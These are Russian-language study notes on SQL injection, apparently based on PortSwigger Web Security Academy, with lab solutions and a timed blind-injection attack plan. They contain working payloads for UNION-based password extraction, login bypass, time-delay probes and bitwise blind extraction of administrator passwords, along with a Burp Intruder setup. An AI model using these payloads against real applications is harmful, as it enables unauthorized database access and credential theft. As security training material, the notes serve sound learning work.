# Введение

Уязвимости SQL-инъекций могут возникать в любой точке запроса и в разных типах запросов. Некоторые другие распространённые места, где возникает SQL-инъекция:

- В операторах `UPDATE`, внутри обновлённых значений или `WHERE` условиях. 
- В операторах `INSERT`, внутри вставленных значений. 
- В операторах `SELECT`, внутри названия таблицы или столбца. 
- В операторах `SELECT`, внутри `ORDER BY`. 

---

# Исследование базы данных

| **Database type** | **Query**                 |
| ----------------- | ------------------------- |
| Microsoft, MySQL  | `SELECT @@version`        |
| Oracle            | `SELECT * FROM v$version` |
| PostgreSQL        | `SELECT version()`        |

---

## Перечисление содержимого базы данных

Большинство типов баз данных (кроме Oracle) имеют набор представлений, называемый информационной схемой. Это предоставляет информацию о базе данных.

Например, вы можете запросить таблицы в базе данных `information_schema.tables`: 

```sql
SELECT * FROM information_schema.tables
```

Он возвращает выходные данные, например:

```
TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	TABLE_TYPE =====================================================
MyDatabase		dbo				Products	BASE TABLE
MyDatabase		dbo				Users		BASE TABLE 
MyDatabase		dbo				Feedback	BASE TABLE
```

Этот выход показывает, что существует три таблицы: `Products`, `Users`, и `Feedback`. 

Затем вы можете запросить столбцы отдельных таблиц в `information_schema.columns`: 

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Он возвращает выходные данные, например:

```
TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	COLUMN_NAME	DATA_TYPE =================================================================
MyDatabase		dbo				Users		UserId		int
MyDatabase		dbo				Users		Username	varchar
MyDatabase		dbo				Users		Password	varchar
```

Этот вывод показывает столбцы в указанной таблице и тип данных каждого столбца.

---

# Эксплуатация слепой SQL-инъекции через активацию условных ответов

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- Первое из этих значений заставляет запрос возвращать результаты, потому что введённое условие `AND '1'='1` верно. В результате отображается сообщение «Добро пожаловать обратно». 
- Второе значение приводит к тому, что запрос не возвращает никаких результатов, поскольку введённое условие ложно. Сообщение «Добро пожаловать обратно» — это не выставлен.

Например, предположим, что существует таблица `Users`, вызываемая со столбцами `Username`, `Password`, и пользователь с именем `Administrator`. Вы можете определить пароль для этого пользователя, отправив серию вводных данных для проверки пароля по одному символу за раз. 

Для этого начните со следующего входа:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Это возвращает сообщение «Добро пожаловать обратно», указывающее, что введённое условие истинно, и поэтому первый символ пароля больше `m`. 

Далее мы отправляем следующий ввод:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Это не возвращает сообщение «Добро пожаловать обратно», указывающее на ложное условие, и поэтому первый символ пароля не превышает `t`. 

В конечном итоге мы отправляем следующий ввод, который возвращает сообщение «Добро пожаловать обратно», тем самым подтверждая, что первый символ пароля — `s`: 

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Мы можем продолжить этот процесс, чтобы систематически определить полный пароль для пользователя `Administrator`. 

---

### **2. Слепая SQLi с ограничением времени (10 минут)**

При слепой SQLi с ограничением времени и невозможностью использовать substring (слишком медленно), пентестер должен действовать стратегически:

#### **План атаки на 10 минут:**

###### **Шаг 1: Быстрая разведка (1-2 минуты)**
```sql
-- Определение СУБД
' AND SLEEP(5)--      -- MySQL?
'; WAITFOR DELAY '0:0:5'--  -- SQL Server?
'; SELECT PG_SLEEP(5)--     -- PostgreSQL?

-- Проверка существования таблицы admins
' AND (SELECT COUNT(*) FROM admins)>=1--
```

###### **Шаг 2: Использование битовых операций вместо substring (3-4 минуты)**

```sql
-- Извлечение данных по битам (гораздо быстрее!)
' AND (ASCII(SUBSTRING(password,1,1)) & 1) = 1--   -- Проверяем бит 0 (1)
' AND (ASCII(SUBSTRING(password,1,1)) & 2) = 2--   -- Проверяем бит 1 (2)  
' AND (ASCII(SUBSTRING(password,1,1)) & 4) = 4--   -- Проверяем бит 2 (4)
' AND (ASCII(SUBSTRING(password,1,1)) & 8) = 8--   -- Проверяем бит 3 (8)
' AND (ASCII(SUBSTRING(password,1,1)) & 16) = 16-- -- Проверяем бит 4 (16)
' AND (ASCII(SUBSTRING(password,1,1)) & 32) = 32-- -- Проверяем бит 5 (32)
' AND (ASCII(SUBSTRING(password,1,1)) & 64) = 64-- -- Проверяем бит 6 (64)
' AND (ASCII(SUBSTRING(password,1,1)) & 128) = 128-- -- Проверяем бит 7 (128)
-- и т.д. для каждого бита (8 запросов на символ вместо 256)
```

> **Классический substring (медленно): 256 запросов на символ;**
> **Битовые операции (быстро). Как работает:**
> >- Каждый символ кодируется 8 битами
> >- Оператор `&` (AND) проверяет конкретный бит
> >- По результатам 8 запросов восстанавливаем ASCII-код
> >- **Результат:** 8 запросов на символ.

**Пример для символа 'A' (ASCII 65):**
```txt
65 в двоичном: 01000001
Бит 0: 65 & 1 = 1    ✓
Бит 1: 65 & 2 = 0    ✗  
Бит 2: 65 & 4 = 0    ✗
Бит 3: 65 & 8 = 0    ✗
Бит 4: 65 & 16 = 0   ✗
Бит 5: 65 & 32 = 0   ✗
Бит 6: 65 & 64 = 64  ✓
Бит 7: 65 & 128 = 0  ✗
```

###### **Шаг 2 (альтернатива): Использование бинарного поиска (2-3 минуты)**

```sql
-- Бинарный поиск по ASCII коду
' AND (ASCII(SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)) > 128)--
' AND (ASCII(SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)) > 64)--
-- Каждый запрос делит пространство пополам (8 запросов на символ)
```

Дополнительно. **Определение реальной длины**:

На практике, перед извлечением данных мы сначала определяем длину:
``` sql
' AND (SELECT LENGTH(password) FROM admins LIMIT 1)=32--
```

###### **Шаг 4: Извлечение только критически важных данных (оставшееся время)**

```sql
-- Фокус на хешах паролей (первые несколько символов могут быть достаточны)
-- Если таблица небольшая - попытка извлечь все сразу через ошибку
-- Так проверяются первые 6-7 символов хеша
-- Используя словарь распространенных хешей
' AND (SELECT LEFT(password,8) FROM admins LIMIT 1)='5f4dcc3'--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE '5f4dcc%')=1--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE 'e10adc%')=1--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE 'd8578e%')=1--

-- Извлечение только хешей (MD5, SHA1) которые можно brute-force'ить оффлайн
' AND (SELECT password FROM admins LIMIT 1) LIKE '[a-f0-9]%'--
```

**Логика LEFT():**
- Хеши паролей имеют предсказуемые паттерны
- **MD5:** 32 hex-символа, начинается с определенных значений
- **Пример:** `5f4dcc3` — начало MD5 хеша для пароля "password"
- Проверяем первые 8 символов вместо полного хеша

**Логика LIKE:**
- Вместо перебора всех символов проверяем распространенные хеши
- **Пример словаря:**
    - `5f4dcc3` (password), `e10adc3` (123456), `d8578ed` (password123)
- Если знаем, что используется MD5/SHA1 — проверяем только hex-символы \[a-f0-9]
- Резко сокращает пространство поиска

**Эффективность:**
- Вместо 95 возможных символов → только 16 hex-символов
- Вместо перебора 256 вариантов на символ → проверка 10-20 популярных хешей

**Логика проверки формата хеша:**
- Фильтруем по формату хеша (только hex-символы)
- Если условие истинно — это точно хеш, а не plaintext пароль
- Можно brute-force оффлайн

---

# Лабораторные

---

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

[SQL injection - Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data)

```
https://*.web-security-academy.net/products?category=Gifts'+OR+1=1--
```

---

### Lab: SQL injection vulnerability allowing login bypass

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass

Login with username:
```
administrator'--
```

---

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns#

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--
```

---

### Lab: SQL injection UNION attack, finding a column containing text

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,'a',NULL--
```

---

### Lab: SQL injection UNION attack, retrieving data from other tables

[SQL injection - Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT username,password FROM users--
```

---

### Lab: SQL injection UNION attack, retrieving multiple values in a single column

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

```
https://*.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,username || '~' || password FROM users--
```

---

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

``` 
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,@@version--%20
```

---

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```

> `users_snzbjx`

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns--
```

>`username_ekbzum`
>`password_kiambz`

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT username_ekbzum,password_kiambz FROM users_snzbjx--
```

> `administrator`
> `73v7efdwjhbybpfu6e5d`

---

### Lab: Blind SQL injection with conditional responses

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#

```http
-- Проверка существования таблицы users
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(*) FROM users)>=1--;
```

```http
-- Проверка существования username и password в таблице users
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(password) FROM users)>=1--;
--
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(username) FROM users)>=1--;
-- Проверка существования username = administrator в таблице users
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(*) FROM users WHERE username='administrator')>=1--;
```

подбор длинны пароля `administrator`:
```http
--
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--;
```

intruder - подбор пароля с помощью битовых операция.

> Тип атаки: **Cluster Bomb**
> Payload 1: Numbers \[1-20]
> Payload 2: Simple list \[128,64,32,16,8,4,2,1]
> Payload 3: Copy other payload 2

```http
--
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT ASCII(SUBSTRING(password,§1§,1)) & §1§ FROM users WHERE username='administrator')=§1§--; 
```

1. Отсортируем по возрастанию Payload 1.  
2. Во вкладке Settings готового сканирования переходим к разделу Grep - Match. Включаем его, удаляем ненужные слова, вставляем искомое (в данном случае Welcome)
3. Сохраняем таблицу. Копируем столбец Welcome, делаем из него строку. **Удаляем самый первый символ.**
4. Переводим с помощью python скрипта в нормальный вид:

``` python
def binary_to_text(binary_string):
    # Проверяем, что строка состоит только из 0 и 1
    if not all(c in '01' for c in binary_string):
        return "Ошибка: строка должна содержать только нули и единицы"
    # Разбиваем строку на байты (по 8 символов)
    bytes_list = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    # Конвертируем каждый байт в символ ASCII
    text = ''
    for byte in bytes_list:
        if len(byte) == 8:  # Игнорируем неполные байты
            decimal_value = int(byte, 2)
            text += chr(decimal_value)
    return text

if __name__ == "__main__":
    user_input = input("Введите двоичную строку: ")
    result = binary_to_text(user_input)
    print(f"Результат: {result}")
```

> Результат: `xpsq8dkzsohudnfrcmor`

---